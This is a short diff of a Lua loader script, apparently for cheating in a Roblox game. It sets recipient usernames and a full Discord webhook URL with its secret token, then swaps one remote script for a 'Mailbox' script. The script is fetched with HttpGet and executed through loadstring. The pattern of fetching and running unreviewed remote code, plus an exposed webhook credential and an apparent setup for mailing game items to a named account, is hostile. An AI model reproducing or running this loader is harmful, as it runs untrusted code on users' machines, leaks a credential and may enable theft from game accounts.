@@ -2,4 +2,4 @@ _G.UserName = "hungkhanhkiet3"
 _G.UserName2 = "nozom01" -- optional
 _G.Webhook = "https://discord.com/api/webhooks/1110203224117481502/NSPBxO9gvVIes_efDckuzFS5j6I0kps86L_kF2sTh7qsQlvVkf8FNRSs0HDea51r5y26" -- optional
     
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Markzami/Project-WD/main/farm", true))()
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
